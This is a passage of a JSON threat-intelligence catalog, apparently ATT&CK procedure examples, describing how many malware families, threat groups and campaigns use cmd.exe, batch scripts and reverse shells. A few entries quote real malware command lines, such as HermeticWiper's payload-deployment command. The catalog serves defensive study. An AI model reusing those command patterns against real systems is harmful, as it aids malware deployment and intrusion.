                        "ID": "S0632",
                        "Name": "GrimAgent",
                        "Description": "<name> can use the Windows Command Shell to execute commands, including its own removal.[155]"
                    },
                    "S0132": {
                        "ID": "S0132",
                        "Name": "H1N1",
                        "Description": "<name> kills and disables services by using cmd.exe.[156]"
                    },
                    "G0125": {
                        "ID": "G0125",
                        "Name": "HAFNIUM",
                        "Description": "<name> has used cmd.exe to execute commands on the victim's machine.[157]"
                    },
                    "S0246": {
                        "ID": "S0246",
                        "Name": "HARDRAIN",
                        "Description": "<name> uses cmd.exe to execute netshcommands.[158]"
                    },
                    "S0391": {
                        "ID": "S0391",
                        "Name": "HAWKBALL",
                        "Description": "<name> has created a cmd.exe reverse shell, executed commands, and uploaded output via the command line.[159]"
                    },
                    "S0071": {
                        "ID": "S0071",
                        "Name": "hcdLoader",
                        "Description": "<name> provides command-line access to the compromised system.[160]"
                    },
                    "S0170": {
                        "ID": "S0170",
                        "Name": "Helminth",
                        "Description": "<name> can provide a remote shell. One version of <name> uses batch scripting.[161]"
                    },
                    "S0697": {
                        "ID": "S0697",
                        "Name": "HermeticWiper",
                        "Description": "<name> can use cmd.exe /Q/c move CSIDL_SYSTEM_DRIVE\\temp\\sys.tmp1 CSIDL_WINDOWS\\policydefinitions\\postgresql.exe 1> \\\\127.0.0.1\\ADMIN$\\_1636727589.6007507 2>&1 to deploy on an infected system.[162]"
                    },
                    "S0698": {
                        "ID": "S0698",
                        "Name": "HermeticWizard",
                        "Description": "<name> can use cmd.exe for execution on compromised hosts.[162]"
                    },
                    "S0087": {
                        "ID": "S0087",
                        "Name": "Hi-Zor",
                        "Description": "<name> has the ability to create a reverse shell.[163]"
                    },
                    "S0394": {
                        "ID": "S0394",
                        "Name": "HiddenWasp",
                        "Description": "<name> uses a script to automate tasks on the victim's machine and to assist in execution.[164]"
                    },
                    "G0126": {
                        "ID": "G0126",
                        "Name": "Higaisa",
                        "Description": "<name> used cmd.exe for execution.[165][166][167]"
                    },
                    "S0009": {
                        "ID": "S0009",
                        "Name": "Hikit",
                        "Description": "<name> has the ability to create a remote shell and run given commands.[168]"
                    },
                    "S0232": {
                        "ID": "S0232",
                        "Name": "HOMEFRY",
                        "Description": "<name> uses a command-line interface.[169]"
                    },
                    "S0376": {
                        "ID": "S0376",
                        "Name": "HOPLIGHT",
                        "Description": "<name> can launch cmd.exe to execute commands on the system.[170]"
                    },
                    "S0431": {
                        "ID": "S0431",
                        "Name": "HotCroissant",
                        "Description": "<name> can remotely open applications on the infected host with the ShellExecuteA command.[171]"
                    },
                    "S0070": {
                        "ID": "S0070",
                        "Name": "HTTPBrowser",
                        "Description": "<name> is capable of spawning a reverse shell on a victim.[172]"
                    },
                    "S0068": {
                        "ID": "S0068",
                        "Name": "httpclient",
                        "Description": "<name> opens cmd.exe on the victim.[3]"
                    },
                    "G0119": {
                        "ID": "G0119",
                        "Name": "Indrik Spider",
                        "Description": "<name> has used batch scripts on victim's machines.[173]"
                    },
                    "S0259": {
                        "ID": "S0259",
                        "Name": "InnaputRAT",
                        "Description": "<name> launches a shell to execute commands on the victim\u2019s machine.[174]"
                    },
                    "S0260": {
                        "ID": "S0260",
                        "Name": "InvisiMole",
                        "Description": "<name> can launch a remote shell to execute commands.[175][176]"
                    },
                    "S0015": {
                        "ID": "S0015",
                        "Name": "Ixeshe",
                        "Description": "<name> is capable of executing commands via cmd.[177]"
                    },
                    "S0389": {
                        "ID": "S0389",
                        "Name": "JCry",
                        "Description": "<name> has used cmd.exe to launch PowerShell.[178]"
                    },
                    "S0044": {
                        "ID": "S0044",
                        "Name": "JHUHUGIT",
                        "Description": "<name> uses a .bat file to execute a .dll.[16]"
                    },
                    "S0201": {
                        "ID": "S0201",
                        "Name": "JPIN",
                        "Description": "<name> can use the command-line utility cacls.exe to change file permissions.[6]"
                    },
                    "S0283": {
                        "ID": "S0283",
                        "Name": "jRAT",
                        "Description": "<name> has command line access.[179]"
                    },
                    "S0088": {
                        "ID": "S0088",
                        "Name": "Kasidet",
                        "Description": "<name> can execute commands using cmd.exe.[180]"
                    },
                    "S0265": {
                        "ID": "S0265",
                        "Name": "Kazuar",
                        "Description": "<name> uses cmd.exe to execute commands on the victim\u2019s machine.[181]"
                    },
                    "G0004": {
                        "ID": "G0004",
                        "Name": "Ke3chang",
                        "Description": "<name> has used batch scripts in its malware to install persistence mechanisms.[182]"
                    },
                    "S1020": {
                        "ID": "S1020",
                        "Name": "Kevin",
                        "Description": "<name> can use a renamed image of cmd.exe for execution.[183]"
                    },
                    "S0387": {
                        "ID": "S0387",
                        "Name": "KeyBoy",
                        "Description": "<name> can launch interactive shells for communicating with the victim machine.[184][185]"
                    },
                    "S0271": {
                        "ID": "S0271",
                        "Name": "KEYMARBLE",
                        "Description": "<name> can execute shell commands using cmd.exe.[186]"
                    },
                    "S0526": {
                        "ID": "S0526",
                        "Name": "KGH_SPY",
                        "Description": "<name> has the ability to set a Registry key to run a cmd.exe command.[187]"
                    },
                    "G0094": {
                        "ID": "G0094",
                        "Name": "Kimsuky",
                        "Description": "<name> has executed Windows commands by using cmd and running batch scripts.[188][189]"
                    },
                    "S0250": {
                        "ID": "S0250",
                        "Name": "Koadic",
                        "Description": "<name> can open an interactive command-shell to perform command line functions on victim machines. <name> performs most of its operations using Windows Script Host (Jscript) and to run arbitrary shellcode.[190][191]"
                    },
                    "S0669": {
                        "ID": "S0669",
                        "Name": "KOCTOPUS",
                        "Description": "<name> has used cmd.exe and batch files for execution.[191]"
                    },
                    "S0156": {
                        "ID": "S0156",
                        "Name": "KOMPROGO",
                        "Description": "<name> is capable of creating a reverse shell.[192]"
                    },
                    "S0356": {
                        "ID": "S0356",
                        "Name": "KONNI",
                        "Description": "<name> has used cmd.exe to execute arbitrary commands on the infected host across different stages of the infection chain.[193][194][195]"
                    },
                    "G0032": {
                        "ID": "G0032",
                        "Name": "Lazarus Group",
                        "Description": "<name> malware uses cmd.exe to execute commands on a compromised host.[196][197][198][199][200] A Destover-like variant used by <name> uses a batch file mechanism to delete its binaries from the system.[201]"
                    },
                    "G0140": {
                        "ID": "G0140",
                        "Name": "LazyScripter",
                        "Description": "<name> has used batch files to deploy open-source and multi-stage RATs.[191]"
                    },
                    "S0395": {
                        "ID": "S0395",
                        "Name": "LightNeuron",
                        "Description": "<name> is capable of executing commands via cmd.exe.[202]"
                    },
                    "S0211": {
                        "ID": "S0211",
                        "Name": "Linfo",
                        "Description": "<name> creates a backdoor through which remote attackers can start a remote shell.[203]"
                    },
                    "S0681": {
                        "ID": "S0681",
                        "Name": "Lizar",
                        "Description": "<name> has a command to open the command-line on the infected system.[204][205]"
                    },
                    "S0447": {
                        "ID": "S0447",
                        "Name": "Lokibot",
                        "Description": "<name> has used cmd /c commands embedded within batch scripts.[206]"
                    },
                    "S0582": {
                        "ID": "S0582",
                        "Name": "LookBack",
                        "Description": "<name> executes the cmd.exe command.[207]"
                    },
                    "S0451": {
                        "ID": "S0451",
                        "Name": "LoudMiner",
                        "Description": "<name> used a batch script to run the Linux virtual machine as a service.[208]"
                    },
                    "S0532": {
                        "ID": "S0532",
                        "Name": "Lucifer",
                        "Description": "<name> can issue shell commands to download and execute additional payloads.[209]"
                    },
                    "G0095": {
                        "ID": "G0095",
                        "Name": "Machete",
                        "Description": "<name> has used batch files to initiate additional downloads of malicious files.[210]"
                    },
                    "S1060": {
                        "ID": "S1060",
                        "Name": "Mafalda",
                        "Description": "<name> can execute shell commands using cmd.exe.[211]"
                    },
                    "G0059": {
                        "ID": "G0059",
                        "Name": "Magic Hound",
                        "Description": "<name> has used the command-line interface for code execution.[212][213][214]"
                    },
                    "S0652": {
                        "ID": "S0652",
                        "Name": "MarkiRAT",
                        "Description": "<name> can utilize cmd.exe to execute commands in a victim's environment.[215]"
                    },
                    "S0449": {
                        "ID": "S0449",
                        "Name": "Maze",
                        "Description": "The <name> encryption process has used batch scripts with various commands.[216][217]"
                    },
                    "S0500": {
                        "ID": "S0500",
                        "Name": "MCMD",
                        "Description": "<name> can launch a console process (cmd.exe) with redirected standard input and output.[218]"
                    },
                    "S0459": {
                        "ID": "S0459",
                        "Name": "MechaFlounder",
                        "Description": "<name> has the ability to run commands on a compromised host.[219]"
                    },
                    "S0576": {
                        "ID": "S0576",
                        "Name": "MegaCortex",
                        "Description": "<name> has used .cmd scripts on the victim's system.[220]"
                    },
                    "G0045": {
                        "ID": "G0045",
                        "Name": "menuPass",
                        "Description": "<name> executes commands using a command-line interface and reverse shell. The group has used a modified version of pentesting script wmiexec.vbs to execute commands.[221][222][223][224] <name> has used malicious macros embedded inside Office documents to execute files.[225][224]"
                    },
                    "G1013": {
                        "ID": "G1013",
                        "Name": "Metador",
                        "Description": "<name> has used the Windows command line to execute commands.[226]"
                    },
                    "S0455": {
                        "ID": "S0455",
                        "Name": "Metamorfo",
                        "Description": "<name> has used cmd.exe /c to execute files.[227]"
                    },
                    "S0688": {
                        "ID": "S0688",
                        "Name": "Meteor",
                        "Description": "<name> can run set.bat, update.bat, cache.bat, bcd.bat, msrun.bat, and similar scripts.[228]"
                    },
                    "S0339": {
                        "ID": "S0339",
                        "Name": "Micropsia",
                        "Description": "<name> creates a command-line shell using cmd.exe.[229]"
                    },
                    "S1015": {
                        "ID": "S1015",
                        "Name": "Milan",
                        "Description": "<name> can use cmd.exe for discovery actions on a targeted system.[99]"
                    },
                    "S0280": {
                        "ID": "S0280",
                        "Name": "MirageFox",
                        "Description": "<name> has the capability to execute commands using cmd.exe.[230]"
                    },
                    "S0084": {
                        "ID": "S0084",
                        "Name": "Mis-Type",
                        "Description": "<name> has used cmd.exe to run commands on a compromised host.[231]"
                    },
                    "S0083": {
                        "ID": "S0083",
                        "Name": "Misdat",
                        "Description": "<name> is capable of providing shell functionality to the attacker to execute commands.[231]"
                    },
                    "S0080": {
                        "ID": "S0080",
                        "Name": "Mivast",
                        "Description": "<name> has the capability to open a remote shell and run basic commands.[232]"
                    },
                    "S0553": {
                        "ID": "S0553",
                        "Name": "MoleNet",
                        "Description": "<name> can execute commands via the command line utility.[112]"
                    },
                    "S0149": {
                        "ID": "S0149",
                        "Name": "MoonWind",
                        "Description": "<name> can execute commands via an interactive command shell.[233] <name> uses batch scripts for various purposes, including to restart and uninstall itself.[233]"
                    },
                    "S0284": {
                        "ID": "S0284",
                        "Name": "More_eggs",
                        "Description": "<name> has used cmd.exe for execution.[234][235]"
                    },
                    "S0256": {
                        "ID": "S0256",
                        "Name": "Mosquito",
                        "Description": "<name> executes cmd.exe and uses a pipe to read the results and send back the output to the C2 server.[236]"
                    },
                    "G0069": {
                        "ID": "G0069",
                        "Name": "MuddyWater",
                        "Description": "<name> has used a custom tool for creating reverse shells.[237]"
                    },
                    "S0233": {
                        "ID": "S0233",
                        "Name": "MURKYTOP",
                        "Description": "<name> uses the command-line interface.[169]"
                    },
                    "G0129": {
                        "ID": "G0129",
                        "Name": "Mustang Panda",
                        "Description": "<name> has executed HTA files via cmd.exe, and used batch scripts for collection.[238][239]"
                    },
                    "S0336": {
                        "ID": "S0336",
                        "Name": "NanoCore",
                        "Description": "<name> can open a remote command-line interface and execute commands.[240] <name> uses JavaScript files.[241]"
                    },
                    "S0247": {
                        "ID": "S0247",
                        "Name": "NavRAT",
                        "Description": "<name> leverages cmd.exe to perform discovery techniques.[242] <name> loads malicious shellcode and executes it in memory.[242]"
                    },
                    "S0630": {
                        "ID": "S0630",
                        "Name": "Nebulae",
                        "Description": "<name> can use CMD to execute a process.[243]"
                    },
                    "S0034": {
                        "ID": "S0034",
                        "Name": "NETEAGLE",
                        "Description": "<name> allows adversaries to execute shell commands on the infected host.[36]"
                    },
                    "S0457": {
                        "ID": "S0457",
                        "Name": "Netwalker",
                        "Description": "Operators deploying <name> have used batch scripts to retrieve the <name> payload.[244]"
                    },
                    "S0198": {
                        "ID": "S0198",
                        "Name": "NETWIRE",
                        "Description": "<name> can issue commands using cmd.exe.[245][246]"
                    },
                    "C0002": {
                        "ID": "C0002",
                        "Name": "Night Dragon",
                        "Description": "During <name>, threat actors used zwShell to establish full remote control of the connected machine and run command-line shells.[247]"
                    },
                    "S0385": {
                        "ID": "S0385",
                        "Name": "njRAT",
                        "Description": "<name> can launch a command shell interface for executing commands.[248]"
                    },
                    "G0133": {
                        "ID": "G0133",
                        "Name": "Nomadic Octopus",
                        "Description": "<name> used cmd.exe /c within a malicious macro.[249]"
                    },
                    "S0346": {
                        "ID": "S0346",
                        "Name": "OceanSalt",
                        "Description": "<name> can create a reverse shell on the infected endpoint using cmd.exe.[250] <name> has been executed via malicious macros.[250]"
                    },
                    "G0049": {
                        "ID": "G0049",
                        "Name": "OilRig",
                        "Description": "<name> has used macros to deliver malware such as QUADAGENT and OopsIE.[251][252][253][254][255] <name> has used batch scripts.[251][252][253][254][255]"
                    },
                    "S0439": {
                        "ID": "S0439",
                        "Name": "Okrum",
                        "Description": "<name>'s backdoor has used cmd.exe to execute arbitrary commands as well as batch scripts to update itself to a newer version.[256]"
                    },
                    "S0264": {
                        "ID": "S0264",
                        "Name": "OopsIE",
                        "Description": "<name> uses the command prompt to execute commands on the victim's machine.[253][257]"
                    },
                    "C0012": {
                        "ID": "C0012",
                        "Name": "Operation CuckooBees",
                        "Description": "During <name>, the threat actors used batch scripts to perform reconnaissance.[258]"
                    },
                    "C0022": {
                        "ID": "C0022",
                        "Name": "Operation Dream Job",
                        "Description": "During <name>, Lazarus Group launched malicious DLL files, created new folders, and renamed folders with the use of the Windows command shell.[259][260]"
                    },
                    "C0006": {
                        "ID": "C0006",
                        "Name": "Operation Honeybee",
                        "Description": "During <name>, various implants used batch scripting and cmd.exe for execution.[261]"
                    },
                    "C0014": {
                        "ID": "C0014",
                        "Name": "Operation Wocao",
                        "Description": "During <name>, threat actors spawned a new cmd.exe process to execute commands.[262]"
                    },
                    "S0229": {
                        "ID": "S0229",
                        "Name": "Orz",
                        "Description": "<name> can execute shell commands.[263] <name> can execute commands with JavaScript.[263]"
                    },
                    "S0594": {
                        "ID": "S0594",
                        "Name": "Out1",
                        "Description": "<name> can use native command line for execution.[264]"
                    },
                    "S1017": {
                        "ID": "S1017",
                        "Name": "OutSteel",
                        "Description": "<name> has used cmd.exe to scan a compromised host for specific file extensions.[118]"
                    },
                    "G0040": {
                        "ID": "G0040",
                        "Name": "Patchwork",
                        "Description": "<name> ran a reverse shell with Meterpreter.[265] <name> used JavaScript code and .SCT files on victim machines.[40][266]"
                    },
                    "S1050": {
                        "ID": "S1050",
                        "Name": "PcShare",
                        "Description": "<name> can execute cmd commands on a compromised host.[69]"
                    },
                    "S0643": {
                        "ID": "S0643",
                        "Name": "Peppy",
                        "Description": "<name> has the ability to execute shell commands.[267]"
                    },
                    "S0158": {
                        "ID": "S0158",
                        "Name": "PHOREAL",
                        "Description": "<name> is capable of creating reverse shell.[192]"
                    },
                    "S1031": {
                        "ID": "S1031",
                        "Name": "PingPull",
                        "Description": "<name> can use cmd.exe to run various commands as a reverse shell.[268]"
                    },
                    "S0124": {
                        "ID": "S0124",
                        "Name": "Pisloader",
                        "Description": "<name> uses cmd.exe to set the Registry Run key value. It also has a command to spawn a command shell.[269]"
                    },
                    "S0254": {
                        "ID": "S0254",
                        "Name": "PLAINTEE",
                        "Description": "<name> uses cmd.exe to execute commands on the victim\u2019s machine.[270]"
                    },
                    "S0435": {
                        "ID": "S0435",
                        "Name": "PLEAD",
                        "Description": "<name> has the ability to execute shell commands on the compromised host.[271]"
                    },
                    "S0013": {
                        "ID": "S0013",
                        "Name": "PlugX",
                        "Description": "<name> allows actors to spawn a reverse shell on a victim.[172][272]"
                    },
                    "S0428": {
                        "ID": "S0428",
                        "Name": "PoetRAT",
                        "Description": "<name> has called cmd through a Word document macro.[273]"
                    },
                    "S0012": {
                        "ID": "S0012",
                        "Name": "PoisonIvy",
                        "Description": "<name> creates a backdoor through which remote attackers can open a command-line interface.[274]"
                    },
                    "S0453": {
                        "ID": "S0453",
                        "Name": "Pony",
                        "Description": "<name> has used batch scripts to delete itself after execution.[275]"
                    },
                    "S0139": {
                        "ID": "S0139",
                        "Name": "PowerDuke",
                        "Description": "<name> runs cmd.exe /c and sends the output to its C2.[276]"
                    },
                    "S0184": {
                        "ID": "S0184",
                        "Name": "POWRUNER",
                        "Description": "<name> can execute commands from its C2 server.[251]"
                    },
                    "S0238": {
                        "ID": "S0238",
                        "Name": "Proxysvc",
                        "Description": "<name> executes a binary on the system and logs the results into a temp file by using: cmd.exe /c \" > %temp%\\PM* .tmp 2>&1\".[201]"
                    },
                    "S0147": {
                        "ID": "S0147",
                        "Name": "Pteranodon",
                        "Description": "<name> can use cmd.exe for execution on victim systems.[144][277]"
                    },
                    "S1032": {
                        "ID": "S1032",
                        "Name": "PyDCrypt",
                        "Description": "<name> has used cmd.exe for execution.[278]"
                    },
                    "S0650": {
                        "ID": "S0650",
                        "Name": "QakBot",
                        "Description": "<name> can use cmd.exe to launch itself and to execute multiple C2 commands.[279][280][281][89]"
                    },
                    "S0269": {
                        "ID": "S0269",
                        "Name": "QUADAGENT",
                        "Description": "<name> uses cmd.exe to execute scripts and commands on the victim\u2019s machine.[254]"
                    },
                    "S0262": {
                        "ID": "S0262",
                        "Name": "QuasarRAT",
                        "Description": "<name> can launch a remote shell to execute commands on the victim\u2019s machine.[282][283]"
                    },
                    "S0481": {
                        "ID": "S0481",
                        "Name": "Ragnar Locker",
                        "Description": "<name> has used cmd.exe and batch scripts to execute commands.[284]"
                    },
                    "S0629": {
                        "ID": "S0629",
                        "Name": "RainyDay",
                        "Description": "<name> can use the Windows Command Shell for execution.[243]"
                    },
                    "G0075": {
                        "ID": "G0075",
                        "Name": "Rancor",
                        "Description": "<name> has used cmd.exe to execute commmands.[270]"
                    },
                    "S0241": {
                        "ID": "S0241",
                        "Name": "RATANKBA",
                        "Description": "<name> uses cmd.exe to execute commands.[285][286]"
                    },
                    "S0662": {
                        "ID": "S0662",
                        "Name": "RCSession",
                        "Description": "<name> can use cmd.exe for execution on compromised hosts.[77]"
                    },
                    "S0495": {
                        "ID": "S0495",
                        "Name": "RDAT",
                        "Description": "<name> has executed commands using cmd.exe /c.[287]"
                    },
                    "S0153": {
                        "ID": "S0153",
                        "Name": "RedLeaves",
                        "Description": "<name> can receive and execute commands with cmd.exe. It can also provide a reverse shell.[222][288]"
                    },
                    "S0332": {
                        "ID": "S0332",
                        "Name": "Remcos",
                        "Description": "<name> can launch a remote command line to execute commands on the victim\u2019s machine.[289]"
                    },
                    "S0375": {
                        "ID": "S0375",
                        "Name": "Remexi",
                        "Description": "<name> silently executes received commands with cmd.exe.[290]"
                    },
                    "S0379": {
                        "ID": "S0379",
                        "Name": "Revenge RAT",
                        "Description": "<name> uses cmd.exe to execute commands and run scripts on the victim's machine.[291]"
                    },
                    "S0496": {
                        "ID": "S0496",
                        "Name": "REvil",
                        "Description": "<name> can use the Windows command line to delete volume shadow copies and disable recovery.[292][293][294][295]"
                    },
                    "S0258": {
                        "ID": "S0258",
                        "Name": "RGDoor",
                        "Description": "<name> uses cmd.exe to execute commands on the victim\u2019s machine.[296]"
                    },
                    "S0448": {
                        "ID": "S0448",
                        "Name": "Rising Sun",
                        "Description": "<name> has executed commands using cmd.exe /c \"<command> > <%temp%>\\AM<random>. tmp\" 2>&1.[297]"
                    },
                    "S0400": {
                        "ID": "S0400",
                        "Name": "RobbinHood",
                        "Description": "<name> uses cmd.exe on the victim's computer.[298]"
                    },
                    "S0270": {
                        "ID": "S0270",
                        "Name": "RogueRobin",
                        "Description": "<name> uses Windows Script Components.[299][300]"
                    },
                    "S0148": {
                        "ID": "S0148",
                        "Name": "RTM",
                        "Description": "<name> uses the command line and rundll32.exe to execute.[301]"
                    },
                    "S0253": {
                        "ID": "S0253",
                        "Name": "RunningRAT",
                        "Description": "<name> uses a batch file to kill a security program task and then attempts to remove itself.[149]"
                    },
                    "S0446": {
                        "ID": "S0446",
                        "Name": "Ryuk",
                        "Description": "<name> has used cmd.exe to create a Registry entry to establish persistence.[302]"
                    },
                    "S0085": {
                        "ID": "S0085",
                        "Name": "S-Type",
                        "Description": "<name> has provided the ability to execute shell commands on a compromised host.[231]"
                    },
                    "S1018": {
                        "ID": "S1018",
                        "Name": "Saint Bot",
                        "Description": "<name> has used cmd.exe and .bat scripts for execution.[118]"
                    },
                    "S0074": {
                        "ID": "S0074",
                        "Name": "Sakula",
                        "Description": "<name> calls cmd.exe to run various DLL files via rundll32 and also to perform file cleanup. <name> also has the capability to invoke a reverse shell.[303]"
                    },
                    "S0370": {
                        "ID": "S0370",
                        "Name": "SamSam",
                        "Description": "<name> uses custom batch scripts to execute some of its components.[304]"
                    },
                    "S1099": {
                        "ID": "S1099",
                        "Name": "Samurai",
                        "Description": "<name> can use a remote command module for execution via the Windows command line.[305]"
                    },
                    "S1085": {
                        "ID": "S1085",
                        "Name": "Sardonic",
                        "Description": "<name> has the ability to run cmd.exe or other interactive processes on a compromised computer.[138]"
                    },
                    "S0461": {
                        "ID": "S0461",
                        "Name": "SDBbot",
                        "Description": "<name> has the ability to use the command shell to execute commands on a compromised host.[306]"
                    },
                    "S0053": {
                        "ID": "S0053",
                        "Name": "SeaDuke",
                        "Description": "<name> is capable of executing commands.[307]"
                    },
                    "S0345": {
                        "ID": "S0345",
                        "Name": "Seasalt",
                        "Description": "<name> uses cmd.exe to create a reverse shell on the infected endpoint.[47]"
                    },
                    "S0185": {
                        "ID": "S0185",
                        "Name": "SEASHARPEE",
                        "Description": "<name> can execute commands on victims.[308]"
                    },
                    "S0382": {
                        "ID": "S0382",
                        "Name": "ServHelper",
                        "Description": "<name> can execute shell commands against cmd.[309][310]"
                    },
                    "S0639": {
                        "ID": "S0639",
                        "Name": "Seth-Locker",
                        "Description": "<name> can execute commands via the command line shell.[311]"
                    },
                    "S1019": {
                        "ID": "S1019",
                        "Name": "Shark",
                        "Description": "<name> has the ability to use CMD to execute commands.[99][312]"
                    },
                    "S1089": {
                        "ID": "S1089",
                        "Name": "SharpDisco",
                        "Description": "<name> can use cmd.exe to execute plugins and to send command output to  specified SMB shares.[313]"
                    },
                    "S0546": {
                        "ID": "S0546",
                        "Name": "SharpStage",
                        "Description": "<name> can execute arbitrary commands with the command line.[112][113]"
                    },
                    "S0444": {
                        "ID": "S0444",
                        "Name": "ShimRat",
                        "Description": "<name> can be issued a command shell function from the C2.[314]"
                    },
                    "S0610": {
                        "ID": "S0610",
                        "Name": "SideTwist",
                        "Description": "<name> can execute shell commands on a compromised host.[315]"
                    },
                    "G0091": {
                        "ID": "G0091",
                        "Name": "Silence",
                        "Description": "<name> has used Windows command-line to run commands.[316][317][318]"
                    },
                    "S0692": {
                        "ID": "S0692",
                        "Name": "SILENTTRINITY",
                        "Description": "<name> can use cmd.exe to enable lateral movement using DCOM.[319]"
                    },
                    "S0623": {
                        "ID": "S0623",
                        "Name": "Siloscape",
                        "Description": "<name> can run cmd through an IRC channel.[320]"
                    },
                    "S0533": {
                        "ID": "S0533",
                        "Name": "SLOTHFULMEDIA",
                        "Description": "<name> can open a command line to execute commands.[321]"
                    },
                    "S1035": {
                        "ID": "S1035",
                        "Name": "Small Sieve",
                        "Description": "<name> can use cmd.exe to execute commands on a victim's system.[322]"
                    },
                    "S0159": {
                        "ID": "S0159",
                        "Name": "SNUGRIDE",
                        "Description": "<name> is capable of executing commands and spawning a reverse shell.[288]"
                    },
                    "C0024": {
                        "ID": "C0024",
                        "Name": "SolarWinds Compromise",
                        "Description": "During the <name>, APT29 used cmd.exe to execute commands on remote machines.[323][324]"
                    },
                    "G0054": {
                        "ID": "G0054",
                        "Name": "Sowbug",
                        "Description": "<name> has used command line during its intrusions.[325]"
                    },
                    "S0543": {
                        "ID": "S0543",
                        "Name": "Spark",
                        "Description": "<name> can use cmd.exe to run commands.[326]"
                    },
                    "S0390": {
                        "ID": "S0390",
                        "Name": "SQLRat",
                        "Description": "<name> has used SQL to execute JavaScript and VB scripts on the host system.[133]"
                    },
                    "S1030": {
                        "ID": "S1030",
                        "Name": "Squirrelwaffle",
                        "Description": "<name> has used cmd.exe for execution.[327]"
                    },
                    "S1037": {
                        "ID": "S1037",
                        "Name": "STARWHALE",
                        "Description": "<name> has the ability to execute commands via cmd.exe.[328]"
                    },
                    "S0142": {
                        "ID": "S0142",
                        "Name": "StreamEx",
                        "Description": "<name> has the ability to remotely execute commands.[329]"
                    },
                    "S1034": {
                        "ID": "S1034",
                        "Name": "StrifeWater",
                        "Description": "<name> can execute shell commands using cmd.exe.[330]"
                    },
                    "G0039": {
                        "ID": "G0039",
                        "Name": "Suckfly",
                        "Description": "Several tools used by <name> have been command-line driven.[331]"
                    },
                    "S1049": {
                        "ID": "S1049",
                        "Name": "SUGARUSH",
                        "Description": "<name> has used cmd for execution on an infected host.[332]"
                    },
                    "S0464": {
                        "ID": "S0464",
                        "Name": "SYSCON",
                        "Description": "<name> has the ability to execute commands through cmd on a compromised host.[67]"
                    },
                    "G0092": {
                        "ID": "G0092",
                        "Name": "TA505",
                        "Description": "<name> has executed commands using cmd.exe.[333]"
                    },
                    "G0127": {
                        "ID": "G0127",
                        "Name": "TA551",
                        "Description": "<name> has used cmd.exe to execute commands.[334]"
                    },
                    "S0011": {
                        "ID": "S0011",
                        "Name": "Taidoor",
                        "Description": "<name> can copy cmd.exe into the system temp folder.[335]"
                    },
                    "S0586": {
                        "ID": "S0586",
                        "Name": "TAINTEDSCRIBE",
                        "Description": "<name> can enable Windows CLI access and execute files.[336]"
                    },
                    "S1011": {
                        "ID": "S1011",
                        "Name": "Tarrask",
                        "Description": "<name> may abuse the Windows schtasks command-line tool to create \"hidden\" scheduled tasks.[337]"
                    },
                    "S0164": {
                        "ID": "S0164",
                        "Name": "TDTESS",
                        "Description": "<name> provides a reverse shell on the victim.[338]"
                    },
                    "G0139": {
                        "ID": "G0139",
                        "Name": "TeamTNT",
                        "Description": "<name> has used batch scripts to download tools and executing cryptocurrency miners.[339]"
                    },
                    "S0146": {
                        "ID": "S0146",
                        "Name": "TEXTMATE",
                        "Description": "<name> executes cmd.exe to provide a reverse shell to adversaries.[340][341]"
                    },
                    "G0028": {
                        "ID": "G0028",
                        "Name": "Threat Group-1314",
                        "Description": "<name> actors spawned shells on remote systems on a victim network to execute commands.[342]"
                    },
                    "G0027": {
                        "ID": "G0027",
                        "Name": "Threat Group-3390",
                        "Description": "<name> has used command-line interfaces for execution.[73][343]"
                    },
                    "S0668": {
                        "ID": "S0668",
                        "Name": "TinyTurla",
                        "Description": "<name> has been installed using a .bat file.[344]"
                    },
                    "S0004": {
                        "ID": "S0004",
                        "Name": "TinyZBot",
                        "Description": "<name> supports execution from the command-line.[345]"
                    },
                    "G1022": {
                        "ID": "G1022",
                        "Name": "ToddyCat",
                        "Description": "<name> has used .bat scripts and cmd for execution on compromised hosts.[346]"
                    },
                    "S0266": {
                        "ID": "S0266",
                        "Name": "TrickBot",
                        "Description": "<name> has used macros in Excel documents to download and deploy the malware on the user\u2019s machine.[347]"
                    },
                    "S0094": {
                        "ID": "S0094",
                        "Name": "Trojan.Karagany",
                        "Description": "<name> can perform reconnaissance commands on a victim machine via a cmd.exe process.[348]"
                    },
                    "G0081": {
                        "ID": "G0081",
                        "Name": "Tropic Trooper",
                        "Description": "<name> has used Windows command scripts.[349]"
                    },
                    "S0436": {
                        "ID": "S0436",
                        "Name": "TSCookie",
                        "Description": "<name> has the ability to execute shell commands on the infected host.[350]"
                    },
                    "S0647": {
                        "ID": "S0647",
                        "Name": "Turian",
                        "Description": "<name> can create a remote shell and execute commands using cmd.[351]"
                    },
                    "G0010": {
                        "ID": "G0010",
                        "Name": "Turla",
                        "Description": "<name> RPC backdoors have used cmd.exe to execute commands.[352][353]"
                    },
                    "S0199": {
                        "ID": "S0199",
                        "Name": "TURNEDUP",
                        "Description": "<name> is capable of creating a reverse shell.[354]"
                    },
                    "S0263": {
                        "ID": "S0263",
                        "Name": "TYPEFRAME",
                        "Description": "<name> can uninstall malware components using a batch script.[355] <name> can execute commands using a shell.[355]"
                    },
                    "S0333": {
                        "ID": "S0333",
                        "Name": "UBoatRAT",
                        "Description": "<name> can start a command shell.[356]"
                    },
                    "S0221": {
                        "ID": "S0221",
                        "Name": "Umbreon",
                        "Description": "<name> provides access using both standard facilities like SSH and additional access using its backdoor Espeon, providing a reverse shell upon receipt of a special packet[357]"
                    },
                    "S0275": {
                        "ID": "S0275",
                        "Name": "UPPERCUT",
                        "Description": "<name> uses cmd.exe to execute commands on the victim\u2019s machine.[224]"
                    },
                    "S0022": {
                        "ID": "S0022",
                        "Name": "Uroburos",
                        "Description": "<name> has the ability to use the command line for execution on the targeted system.[358]"
                    },
                    "S0452": {
                        "ID": "S0452",
                        "Name": "USBferry",
                        "Description": "<name> can execute various Windows commands.[349]"
                    },
                    "S0180": {
                        "ID": "S0180",
                        "Name": "Volgmer",
                        "Description": "<name> can execute commands on the victim's machine.[359][360]"
                    },
                    "G1017": {
                        "ID": "G1017",
                        "Name": "Volt Typhoon",
                        "Description": "<name> has used the Windows command line to perform hands-on-keyboard activities in targeted environments including for discovery.[361][362][363]"
                    },
                    "S0670": {
                        "ID": "S0670",
                        "Name": "WarzoneRAT",
                        "Description": "<name> can use cmd.exe to execute malicious code.[364]"
                    },
                    "S0612": {
                        "ID": "S0612",
                        "Name": "WastedLocker",
                        "Description": "<name> has used cmd to execute commands on the system.[365]"
                    },
                    "S0109": {
                        "ID": "S0109",
                        "Name": "WEBC2",
                        "Description": "<name> can open an interactive command shell.[12]"
                    },
                    "S0514": {
                        "ID": "S0514",
                        "Name": "WellMess",
                        "Description": "<name> can execute command line scripts received from C2.[366]"
                    },
                    "S0689": {
                        "ID": "S0689",
                        "Name": "WhisperGate",
